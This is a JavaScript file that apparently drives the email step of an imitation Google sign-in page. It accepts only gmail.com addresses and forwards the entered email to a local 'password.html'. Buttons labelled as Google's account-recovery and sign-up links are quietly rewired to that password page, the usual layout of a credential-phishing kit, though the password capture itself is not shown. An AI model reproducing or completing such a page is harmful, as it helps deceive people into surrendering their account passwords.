document.addEventListener('DOMContentLoaded', function() {
    function redirectTo(url) {
        window.location.href = url;
    }

    function saveInputAndRedirect() {
        var inputField = document.getElementById('myInput');
        if (inputField) {
            var inputValue = inputField.value;

            // Check if the input contains exactly one '@'
            var atSymbolCount = (inputValue.match(/@/g) || []).length;

            if (atSymbolCount === 1) {
                // Split the input by '@' to check the domain
                var parts = inputValue.split('@');
                var domain = parts[1];

                if (domain === 'gmail.com') {
                    // Encode the input value to be included in the URL
                    var encodedValue = encodeURIComponent(inputValue);
                    // Redirect to password.html with the encoded input value
                    redirectTo('password.html?signin=' + encodedValue);
                } else {
                    alert('Please enter a valid Gmail address.');
                }
            } else if (atSymbolCount > 1) {
                alert('Please enter a valid email address.');
            } else {
                // No '@' symbol, allow passing to password.html
                redirectTo('password.html?signin=' + encodeURIComponent(inputValue));
            }
        }
    }

    function addButtonListener(buttonId, url) {
        var button = document.getElementById(buttonId);
        if (button) {
            button.addEventListener('click', saveInputAndRedirect);
        }
    }

    addButtonListener('forgot', 'https://accounts.google.com/signin/v2/usernamerecovery');
    addButtonListener('create', 'https://accounts.google.com/signup');
    addButtonListener('privateform', 'https://support.google.com/accounts/answer/2917834');
    addButtonListener('submit', 'password.html');

    var inputField = document.getElementById('myInput');
    if (inputField) {
        inputField.addEventListener('keyup', function(event) {
            if (event.key === 'Enter') {
                // Redirect to 'password.html' or show error message based on validation
                saveInputAndRedirect();
            }
        });

        // Focus on the email input box when the page loads
        inputField.focus();
    }
});
